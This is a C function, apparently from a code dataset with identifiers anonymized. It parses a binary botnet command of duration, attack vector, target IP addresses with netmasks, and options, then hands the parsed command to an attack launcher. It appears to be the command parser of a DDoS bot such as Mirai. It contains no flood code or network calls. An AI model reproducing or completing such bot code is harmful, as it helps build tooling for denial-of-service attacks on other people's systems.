
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {TYPE_1__ sin_addr; int sin_family; } ;
struct attack_target {int netmask; int addr; TYPE_2__ sock_addr; } ;
struct attack_option {int key; void* val; } ;
typedef int ipv4_t ;
typedef scalar_t__ ATTACK_VECTOR ;


 int VAR_0 ;
 int FUNC_0 (int ,scalar_t__,int,struct attack_target*,int,struct attack_option*) ;
 void* FUNC_1 (int,int) ;
 scalar_t__ VAR_1 ;
 int FUNC_2 (struct attack_target*) ;
 int FUNC_3 (struct attack_option*,int) ;
 int FUNC_4 (int ) ;
 int FUNC_5 (void*,char*,int) ;

void FUNC_6(char *VAR_2, int VAR_3)
{
    int VAR_4;
    uint32_t VAR_5;
    ATTACK_VECTOR VAR_6;
    uint8_t VAR_7, VAR_8;
    struct attack_target *VAR_9 = ((void*)0);
    struct attack_option *VAR_10 = ((void*)0);


    if (VAR_3 < sizeof (uint32_t))
        goto cleanup;
    VAR_5 = FUNC_4(*((uint32_t *)VAR_2));
    VAR_2 += sizeof (uint32_t);
    VAR_3 -= sizeof (uint32_t);


    if (VAR_3 == 0)
        goto cleanup;
    VAR_6 = (ATTACK_VECTOR)*VAR_2++;
    VAR_3 -= sizeof (uint8_t);


    if (VAR_3 == 0)
        goto cleanup;
    VAR_7 = (uint8_t)*VAR_2++;
    VAR_3 -= sizeof (uint8_t);
    if (VAR_7 == 0)
        goto cleanup;


    if (VAR_3 < ((sizeof (ipv4_t) + sizeof (uint8_t)) * VAR_7))
        goto cleanup;
    VAR_9 = FUNC_1(VAR_7, sizeof (struct attack_target));
    for (VAR_4 = 0; VAR_4 < VAR_7; VAR_4++)
    {
        VAR_9[VAR_4].addr = *((ipv4_t *)VAR_2);
        VAR_2 += sizeof (ipv4_t);
        VAR_9[VAR_4].netmask = (uint8_t)*VAR_2++;
        VAR_3 -= (sizeof (ipv4_t) + sizeof (uint8_t));

        VAR_9[VAR_4].sock_addr.sin_family = VAR_0;
        VAR_9[VAR_4].sock_addr.sin_addr.s_addr = VAR_9[VAR_4].addr;
    }


    if (VAR_3 < sizeof (uint8_t))
        goto cleanup;
    VAR_8 = (uint8_t)*VAR_2++;
    VAR_3 -= sizeof (uint8_t);


    if (VAR_8 > 0)
    {
        VAR_10 = FUNC_1(VAR_8, sizeof (struct attack_option));
        for (VAR_4 = 0; VAR_4 < VAR_8; VAR_4++)
        {
            uint8_t VAR_11;


            if (VAR_3 < sizeof (uint8_t))
                goto cleanup;
            VAR_10[VAR_4].key = (uint8_t)*VAR_2++;
            VAR_3 -= sizeof (uint8_t);


            if (VAR_3 < sizeof (uint8_t))
                goto cleanup;
            VAR_11 = (uint8_t)*VAR_2++;
            VAR_3 -= sizeof (uint8_t);

            if (VAR_3 < VAR_11)
                goto cleanup;
            VAR_10[VAR_4].val = FUNC_1(VAR_11 + 1, sizeof (char));
            FUNC_5(VAR_10[VAR_4].val, VAR_2, VAR_11);
            VAR_2 += VAR_11;
            VAR_3 -= VAR_11;
        }
    }

    VAR_1 = 0;
    FUNC_0(VAR_5, VAR_6, VAR_7, VAR_9, VAR_8, VAR_10);


    cleanup:
    if (VAR_9 != ((void*)0))
        FUNC_2(VAR_9);
    if (VAR_10 != ((void*)0))
        FUNC_3(VAR_10, VAR_8);
}
